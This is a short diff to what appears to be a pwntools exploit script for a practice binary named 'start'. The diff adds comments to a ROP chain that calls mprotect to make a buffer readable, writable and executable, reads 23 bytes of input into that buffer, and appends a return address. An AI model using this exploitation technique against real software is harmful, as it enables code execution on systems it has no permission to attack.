@@ -28,8 +28,8 @@ read = 0x0
 buf = 0x6cb000
 
 r = ROP("./start")
-r.mprotect(buf, 0x100, 7)
-r.read(0, buf, 23)
+r.mprotect(buf, 0x100, 7) # args are addr, len, protection (rwx)
+r.read(0, buf, 23) # fd, addr, len
 ret = 0x4002f6
 raw_r = str(r)[:-8] + p64(ret)
 
